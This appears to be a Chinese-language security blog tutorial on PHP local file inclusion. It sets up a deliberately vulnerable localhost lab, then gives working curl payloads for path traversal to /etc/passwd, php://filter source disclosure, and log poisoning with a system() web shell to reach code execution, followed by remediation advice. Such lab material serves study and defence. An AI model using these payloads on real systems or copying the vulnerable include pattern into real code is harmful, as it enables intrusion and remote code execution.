---
title: "PHP 本地文件包含（LFI）"
slug: "php-lfi"
date: 2026-08-29T14:43:49+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "控制 file 参数包含任意文件，并分析自动追加 .php 后缀带来的限制。"
summary: "控制 file 参数包含任意文件，并分析自动追加 .php 后缀带来的限制。"
tags: ["PHP", "LFI", "文件包含"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 5
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/10.PHP代码的本地文件包含漏洞.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/php-lfi/workflow.svg" alt="参数进入 include 后，利用路径遍历和可写入载体扩大为代码执行。" loading="lazy">
  <figcaption>图 1 · PHP 本地文件包含链。参数进入 include 后，利用路径遍历和可写入载体扩大为代码执行。</figcaption>
</figure>

## 1. 本地 LFI 环境

创建 `/tmp/lfi-lab/index.php`：

```php
<?php
$file = $_GET['file'] ?? 'home.php';
include $file;
```

创建 `home.php`：

```php
<h1>LFI lab</h1>
```

创建 `secret.php`：

```php
<?php $flag = 'flag{lfi_demo}'; ?>
```

启动：

```bash
cd /tmp/lfi-lab
php -S 127.0.0.1:8080
```

## 2. 路径遍历

```bash
curl -sS --get --data-urlencode 'file=../../../../etc/passwd' \
  'http://127.0.0.1:8080/'
```

## 3. 读取 PHP 源码

```bash
curl -sS --get \
  --data-urlencode 'file=php://filter/read=convert.base64-encode/resource=secret.php' \
  'http://127.0.0.1:8080/' \
  -o /tmp/lfi.b64

base64 -d /tmp/lfi.b64
```

## 4. 从 LFI 走到 RCE

LFI 本身只负责包含文件。要执行代码，需要一个可写入、可被包含的载体。下面用日志模拟：

创建 `poison.php`：

```php
<?php
file_put_contents('/tmp/lfi-access.log', $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
echo "logged\n";
```

发送 PHP 代码作为 User-Agent：

```bash
curl -sS -A '<?php system($_GET["cmd"]); ?>' \
  'http://127.0.0.1:8080/poison.php'
```

再包含日志：

```bash
curl -sS --get \
  --data-urlencode 'file=/tmp/lfi-access.log' \
  --data-urlencode 'cmd=id' \
  'http://127.0.0.1:8080/'
```

预期出现 `uid=`。

## 5. 其他载体

- Web 服务器访问日志；
- SSH / FTP 日志；
- PHP session 文件；
- 上传的临时文件；
- `/proc/self/environ`（取决于环境）。

## 6. 排错

| 现象 | 原因 |
| --- | --- |
| `/etc/passwd` 读不到 | 路径或权限不对 |
| include 后源码不显示 | 被 PHP 执行 |
| 日志里没有 payload | 目标日志路径不同 |
| include 日志报错 | 日志换行/编码破坏 PHP 语法 |

## 7. 修复

- include 使用固定白名单；
- `realpath` + 根目录判断；
- 禁止包含日志、session、上传目录；
- 关闭 `allow_url_include`；
- PHP 代码与用户数据分离。
